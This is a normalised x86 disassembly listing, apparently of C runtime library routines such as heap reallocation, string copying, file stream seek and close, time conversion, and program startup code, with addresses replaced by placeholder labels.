jle r-xdata
call sub_20047ce
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_200893f
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_200898a
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_20088fa
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_2002253
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_200213d
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_200227f
push 0x10
push r--data
call sub_200625c
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_200178d
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_20016b0
pop ecx
jmp r-xdata
call sub_20062a1
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_200663f
pop ecx
call sub_20047ce
push 0x4
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_2005798
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20023c3
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_2005c96
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_200663f
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_2005f77
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_20047ce
call sub_20047ce
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_200663f
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_200478c
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_20047ce
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_20047ce
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_20081d0
push ebx
call sub_2005798
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_20057c8
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_200478c
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_20081d0
push ebx
push [ ebp - 0x20 ]
call sub_20057c8
add esp 0x14
mov eax esi
sub_200249a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_20047ce
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_20047ce
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2004766
add esp 0x14
mov eax esi
jmp r-xdata
sub_200250e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_20047ce
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_200319d
push esi
mov ebx eax
call sub_2008bab
push esi
call sub_200788d
push eax
call sub_2008ade
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_20016b0
pop ecx
mov [ esi + 0x1c ] edi
sub_2002585
push 0xc
push r--data
call sub_200625c
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_20047ce
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_2006a6f
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_200250e
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20025f9
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_20062a1
retn
mov eax [ ebp - 0x1c ]
sub_2002601
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_200788d
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
push 0x1
push ebx
push eax
call sub_2008ea5
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_20047ce
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_2008ea5
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_2008ea5
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_200279e
push 0xc
push r--data
call sub_200625c
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_2006a6f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_2002601
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2002802
mov eax [ ebp - 0x1c ]
call sub_20047ce
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_20062a1
retn
sub_200280c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_20047ce
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_200319d
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_2002601
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_200788d
pop ecx
push eax
call sub_2008ea5
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_2002896
push 0xc
push r--data
call sub_200625c
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_20047ce
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_2006a6f
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200280c
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2002911
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_20062a1
retn
cmp edi 0x2
jne r-xdata
sub_200291b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_2008f90
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_200296c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_200451a
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_200451a
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_2009000
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_2002a5e
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200296c
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_2009000
sub_2002abc
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_2004a21
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_2004817
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_2002b54
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push edi
push esi
call sub_2009070
xor edi edi
pop ecx
cmp esi edi
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
call sub_20047ce
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
pop edi
leave
retn
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp - 0x1c ] eax
sub_2002bbe
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_20091c5
call sub_2002b54
add esp 0x10
pop esi
pop ebp
retn
sub_2002c09
push 0x58
push r--data
call sub_200625c
xor esi esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoA@IAT ]
push 0xfffffffe
pop edi
mov [ ebp - 0x4 ] edi
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_200438d
test eax eax
jne r-xdata
push 0x1c
call sub_2002be0
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_200a7fc
mov [ ebp - 0x4 ] ebx
call sub_2008bdc
test eax eax
jge r-xdata
push 0x10
call sub_2002be0
cmp [ eax + r--data ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_200a6c5
mov [ rw-data ] eax
call sub_200a60a
test eax eax
jge r-xdata
push 0x1b
call sub_2002e95
pop ecx
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_200a392
test eax eax
jge r-xdata
push 0x8
call sub_2002e95
pop ecx
xor ebx ebx
inc ebx
push ebx
call sub_20055b9
pop ecx
test eax eax
jne r-xdata
push ebx
call sub_2002f54
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_2002e95
pop ecx
call sub_200a333
test [ ebp - 0x3c ] bl
je r-xdata
push eax
call sub_2002e95
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_2003131
mov [ ebp - 0x4 ] edi
jmp r-xdata
push eax
call sub_2003105
push ecx
push eax
push esi
push __dos_header
call sub_200fa6c
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
call sub_20062a1
retn
sub_2002d48
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_2003140
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
jmp r-xdata
push eax
call sub_200311b
call sub_20062a1
retn
sub_2002da0
push 0xc
push r--data
call sub_200625c
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_2006998
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_2006ab0
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_2006998
add eax ebx
push eax
call sub_200a9e4
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_2006998
add eax ebx
push eax
call sub_2004a21
mov [ ebp - 0x1c ] eax
call sub_2006998
add eax ebx
push eax
push edi
call sub_200aa80
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2002e3c
mov eax [ ebp - 0x1c ]
call sub_20047ce
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_20062a1
retn
sub_2002e65
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_2002e95
mov edi edi
push ebp
mov ebp esp
call sub_20065f7
push [ ebp + 0x8 ]
call sub_200644c
push [ rw-data ]
call sub_2003ff8
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_2002ebe
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_2002f13
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_2002f30
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_2002f54
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_200abf2
push r--data
push r--data
call sub_2002f30
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_200acb0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_200a822
call sub_200abdb
mov eax r--data
mov [ esp ] r--data
call sub_2002f13
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
xor eax eax
push rw-data
call sub_200acb0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_2002fd9
push 0x18
push r--data
call sub_200625c
push 0x8
call sub_2005765
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20030f0
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_20062a1
retn
mov [ rw-data ] ebx
push 0x8
call sub_200568b
pop ecx
push [ ebp + 0x8 ]
call sub_2002ee9
push r--data
mov eax r--data
call sub_2002f13
pop ecx
push [ rw-data ]
call sub_2003ff8
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_2002f13
pop ecx
push [ rw-data ]
call sub_2003ff8
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_2003fef
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_2003ff8
mov edi eax
call sub_2003fef
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_2003ff8
mov edi eax
push [ rw-data ]
call sub_2003ff8
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_200314f
mov edi edi
push esi
call sub_2003fef
mov esi eax
push esi
call sub_2006630
push esi
call sub_200afe7
push esi
call sub_200462f
push esi
call sub_200afd8
push esi
call sub_200afc9
push esi
call sub_200adb7
push esi
call sub_200a1d2
push esi
call sub_200ada6
push sub_200311b
call sub_2003f7d
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_200319d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_200788d
pop ecx
push eax
call sub_20080ed
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_2003205
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_200319d
pop ecx
test eax eax
je r-xdata
push esi
call sub_200324d
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_200788d
push eax
call sub_200b056
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_200324d
push 0x14
push r--data
call sub_200625c
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_2005765
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200331e
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_20062a1
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_2006ab0
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_20032ef
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_2003205
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_2003205
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_2003330
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_200144c
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2002a5e
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
